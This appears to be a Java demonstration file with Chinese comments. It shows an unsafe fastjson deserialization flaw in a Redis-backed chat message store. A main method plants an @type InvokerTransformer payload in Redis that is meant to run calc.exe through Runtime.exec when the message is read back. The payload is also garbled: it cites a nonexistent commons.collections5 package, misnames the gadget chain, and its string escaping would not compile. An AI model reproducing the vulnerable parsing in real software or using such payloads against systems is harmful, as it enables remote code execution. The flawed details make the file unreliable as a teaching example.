import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import redis.clients.jedis.Jedis;
import java.io.Serializable;
import java.util.function.Function;

// 聊天消息实体类
class ChatMessage implements Serializable {
    private String content;
    private String sender;
    private String receiver;
    
    // Getter和Setter
    public String getContent() { return content; }
    public void setContent(String content) { this.content = content; }
    public String getSender() { return sender; }
    public void setSender(String sender) { this.sender = sender; }
    public String getReceiver() { return receiver; }
    public void setReceiver(String receiver) { this.receiver = receiver; }
}

// Redis操作类
class RedisChatStorage {
    private final Jedis jedis;
    
    public RedisChatStorage() {
        this.jedis = new Jedis("localhost", 6379);
    }
    
    // 存储消息（函数式接口示例）
    public void storeMessage(String key, ChatMessage message) {
        jedis.set(key.getBytes(), JSON.toJSONString(message).getBytes());
    }
    
    // 漏洞点：不安全的反序列化（函数式接口示例）
    public ChatMessage retrieveMessage(String key) {
        byte[] data = jedis.get(key.getBytes());
        if (data == null) return null;
        
        // 模拟开发者错误实现：直接反序列化任意输入
        return ((Function<byte[], ChatMessage>) bytes -> 
            JSON.parseObject(new String(bytes), ChatMessage.class))
            .apply(data);
    }
}

// 漏洞利用示例
class ChatApplication {
    public static void main(String[] args) {
        RedisChatStorage storage = new RedisChatStorage();
        
        // 模拟正常消息存储
        ChatMessage normalMsg = new ChatMessage();
        normalMsg.setContent("Hello World");
        normalMsg.setSender("Alice");
        normalMsg.setReceiver("Bob");
        storage.storeMessage("msg:1", normalMsg);
        
        // 漏洞利用：攻击者控制Redis键值（示例为CommonsCollections5链的JSON表示）
        String maliciousKey = "msg:2";
        String maliciousJson = "{\\"@type\\":\\"org.apache.commons.collections5.functors.InvokerTransformer\\",\\"transformer\\":{\\"@type\\":\\"org.apache.commons.collections5.functors.InvokerTransformer\\",\\"iMethodName\\":\\"exec\\",\\"iParamTypes\\":[\\"java.lang.Class[]\\",\\"java.lang.Object[][]\\"],\\"iArgs\\":[[\\"java.lang.Runtime\\"],[\\"exec\\",[\\"calc.exe\\"]]]}}";
        
        // 攻击者注入恶意数据到Redis
        try (Jedis attackerJedis = new Jedis("localhost", 6379)) {
            attackerJedis.set(maliciousKey.getBytes(), maliciousJson.getBytes());
        }
        
        // 当应用尝试读取被污染的数据时触发漏洞
        System.out.println("[+] 正常消息内容: " + storage.retrieveMessage("msg:1").getContent());
        System.out.println("[+] 恶意消息内容: " + storage.retrieveMessage(maliciousKey).getContent());
    }
}